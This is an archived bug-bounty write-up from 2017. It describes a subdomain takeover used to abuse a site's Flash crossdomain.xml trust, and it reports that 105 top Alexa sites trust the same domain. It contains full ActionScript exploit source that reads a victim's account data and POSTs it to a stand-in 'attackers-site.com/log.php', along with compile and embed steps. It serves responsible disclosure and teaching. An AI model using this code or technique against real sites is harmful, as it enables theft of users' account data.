---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-11-16_bypassing-crossdomain-policy-and-hit-hundreds-of-top-alexa-sites.md
original_filename: 2017-11-16_bypassing-crossdomain-policy-and-hit-hundreds-of-top-alexa-sites.md
title: Bypassing Crossdomain Policy and Hit Hundreds of Top Alexa Sites
category: documents
detected_topics:
- sso
- command-injection
- automation-abuse
- csrf
- api-security
- cloud-security
tags:
- imported
- documents
- sso
- command-injection
- automation-abuse
- csrf
- api-security
- cloud-security
language: en
raw_sha256: f7fc45d3f09e38fe4ffd9aecb12cd0c7b019b65d54454c8de5b6a6b99fb88f72
text_sha256: a655dc34d3fd612926aa3ebac4ff8749145e1264ab1ba4dfd8b7d5fa6c08811e
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing Crossdomain Policy and Hit Hundreds of Top Alexa Sites

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-11-16_bypassing-crossdomain-policy-and-hit-hundreds-of-top-alexa-sites.md
- Source Type: markdown
- Detected Topics: sso, command-injection, automation-abuse, csrf, api-security, cloud-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `f7fc45d3f09e38fe4ffd9aecb12cd0c7b019b65d54454c8de5b6a6b99fb88f72`
- Text SHA256: `a655dc34d3fd612926aa3ebac4ff8749145e1264ab1ba4dfd8b7d5fa6c08811e`


## Content

---
title: "Bypassing Crossdomain Policy and Hit Hundreds of Top Alexa Sites"
url: "https://medium.com/bugbountywriteup/bypassing-crossdomain-policy-and-hit-hundreds-of-top-alexa-sites-af1944f6bbf5"
authors: ["Ak1T4 (@akita_zen)"]
bugs: ["CSRF"]
publication_date: "2017-11-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6052
scraped_via: "browseros"
---

# Bypassing Crossdomain Policy and Hit Hundreds of Top Alexa Sites

Bypassing Crossdomain Policy and Hit Hundreds of Top Alexa Sites
Ak1T4
Follow
6 min read
·
Nov 17, 2017

625

6

Well, was a long time from my last write up so i feel the need to share with the community this interesting bug which i found over an h1 bug bounty program. From now we can call it [redacted.com] to maintain his privacy.

Doing the RECON:

Press enter or click to view image in full size

One wildcard domain line took my attention was like: *.trusted.com

So the next thing was run Sublister to see the subdomains on *.trusted.com

(i can reveal the subdomain because is not patched yet)

I found a sub-domain like “x.media.trusted.com”, this site was pointing to fastly instance and the fastly instance was pointing to a cloud-front instance: how I know it? because I have “Jedi Powers” and trust in the force.. (weird not?).

I try to claim the domain from cloud-front and for my surprise was the right action :). So..I have a successful “Subdomain Takeover” on x.media.trusted.com :)

(takeover’s poc links)

But this “trusted” site has not bbp, so the takeover will be used to create a possible CSRF on main bbp [redacted.com] because is allowed on his crossdomain.xml file. (yeah i know that you know that, but i like repeat things over and over..)

Creating the Awesome CSRF Flash request:

So what we need now? A flash file which act as CSRF and creates a requests to steal the user logged in data on [redacted.com]

First we create the action script file which is something like this:

// ak1t4-poc.as

package {
import flash.display.Sprite;
import flash.events.*;
import flash.net.URLRequestMethod;
import flash.net.URLRequest;
import flash.net.URLLoader;
public class ak1t4-poc extends Sprite {
public function ak1t4-poc() {
// Target URL from where the data is to be retrieved
var readFrom:String = “https://[redacted-com]/account/v3/settings";
var readRequest:URLRequest = new URLRequest(readFrom);
var getLoader:URLLoader = new URLLoader();
getLoader.addEventListener(Event.COMPLETE, eventHandler);
try {
getLoader.load(readRequest);
} catch (error:Error) {
trace(“Error loading URL: “ + error);
}
}
private function eventHandler(event:Event):void {
// URL to which retrieved data is to be sent
var sendTo:String = “https://attackers-site.com/log.php"
var sendRequest:URLRequest = new URLRequest(sendTo);
sendRequest.method = URLRequestMethod.POST;
var body:String = escape(event.target.data);
sendRequest.data = body;
var sendLoader:URLLoader = new URLLoader();
try {
sendLoader.load(sendRequest);
} catch (error:Error) {
trace(“Error loading URL: “ + error);
}
}
}
}

Compiling the Awesome SWF:

/opt/flex/bin/mxmlc /Users/Desktop/ak1t4/ak1t4-poc.as — output exploit.swf

Well, now we embed the .swf file into an html

Get Ak1T4’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

// exp.html

<html>
<object type=”application/x-shockwave-flash” data=”exploit.swf” width=”1" height=”1">
<param name=”movie” value=”exploit.swf” />
</object>
</html>

Now we upload the exploit to the subdomain takeover : “https://x.media.trusted.com/exp.html”

We have our CSRF ready and i feel like:

Testing the CSRF:

Press enter or click to view image in full size

We have interesting things here:

The csrf file which in the screenshot is named “xoxo.html” opened by our victim.
The embed evil.swf file wich do the request to the logged victim user data url with the /profile/ endpoint response as 200 OK
And finally and awesome POST request to log.php file stored on the attackers-site.com/log.php whocreates an stealdata.txt file with all the data retrieved.
Press enter or click to view image in full size

At this time we have a Successfull CSRF Flash attack and we have the user’s data recorded on our server :)

THE-END??

of course not, this story continue and becomes better and better…

Jedi memories:

All this scenario about crossdomain policy hit me directly in my brain and reminds me that something is missing..

The trusted.domain which i takeover was kind familiar from the beginning, so i remember a whitepaper read it on the pass where this domain appears as “trusted” in many others important sites.. so my curiosity take me to a more deeper level to continue my research..

Downloading DATA:

First thing that i do was download top 1000 alexa-sites on my hard drive and then i scrape all domains for view which domains are using the *.trusted.com as allow on their crossdomain.xml file.

skynet-localhost:crossdoamin ak1t4_hax0r$ while read -r line;do cat $line | fgrep trusted.domain;done < cross.list | wc -l

105

Press enter or click to view image in full size

Wow! For my surprise i got a Nice number: “105” domains affected with my CSRF exploit . (Maybe we have a lot of more entries scraping in Alexa top 10.000 :)

(we need to now here that the domains affected should have some interesting to steal: like users account data, sensitive information, etc)

Well we have in our hands 105 domains affected on alexa top sites which at this moment are on “in-security” mode :)

The Fear— The Anger — The Hate:

This story ends with a partial fix from “x.media.trusted.com” domain and with me receiving an awful: “suspended account” from Amazon, because seems they (trusted.domain) do a complaint about the files hosted over my aws account used in the POC :(

*This remember me something like the wise “Yoda” says:

The Strong Side of the Force:

So From The BBP on h1 i receive a nice bounty $$$ for this CSRF report and POC: and now we are all happy again and for sure: more secure :)

[ Special Thanks to these Jedi Masters who open my mind which their awesome lessons ]

Sp1d3r https://twitter.com/h1_sp1d3r (Thanks for your awesome shared knowledge and for your amazing write-ups which are impressive and expands my mind to the next level)
Yassine Aboukir https://twitter.com/Yassineaboukir (The time pass but you are always the same awesome dude that i met a year ago on this crazy world of bug bounties, today i do bounties thanks to your kindness and shared knowledge: im extremely thankful :)
~Kiraak-Boy~ https://twitter.com/ArbazKiraak (A young man with an incredible mind who share his knowledge and improves our community, Keep with your awesome work and thank you again and again for your write ups because im better than yesterday with more knowledge and understanding of things, and our community is better too, thanks man!!)

May the force be with you young padawan!

Happy Hacking! :)

And remember: if you fail? try harder!

@ak1t4

HackerOne profile - ak1t4
Whiteh4t Hack3r & Zen Monk & bounty hunter - https://twitter.com/knowledge_2014

hackerone.com

ak1t4 z3n (@knowledge_2014) | Twitter
The latest Tweets from ak1t4 z3n (@knowledge_2014). Bug Bounty Hunter - HoF : Google - Mozilla - PayPal - Microsoft …

twitter.com
